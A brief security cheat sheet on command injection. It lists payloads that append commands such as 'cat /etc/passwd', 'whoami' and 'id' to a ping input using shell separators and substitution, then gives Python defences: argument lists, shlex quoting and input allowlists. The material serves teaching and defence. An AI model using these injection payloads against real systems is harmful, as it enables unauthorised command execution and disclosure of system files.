# Commands: Become a Hacker

## Command Injection Payloads

| Command | Description |
|---------|-------------|
| `127.0.0.1; ls` | Execute ls after ping |
| `127.0.0.1 && whoami` | Run whoami if ping succeeds |
| `127.0.0.1 \| cat /etc/passwd` | Pipe ping output to read passwd |
| `127.0.0.1 \|\| id` | Run id if ping fails |
| `127.0.0.1 \`id\`` | Command substitution via backticks |
| `127.0.0.1 $(id)` | Command substitution via $() |
| `127.0.0.1 & netstat -an &` | Background inject and run netstat |

## Defence - Python (Safe)

| Command | Description |
|---------|-------------|
| `subprocess.run(["ping", ip])` | Safe — no shell interpretation |
| `import shlex; shlex.quote(user_input)` | Shell-escape untrusted input |

## Defence - Input Validation

| Command | Description |
|---------|-------------|
| `import re; re.match(r"^[\d.]+$", ip)` | Allowlist only digits and dots |
| `if user_input.isdigit():` | Validate integer input |
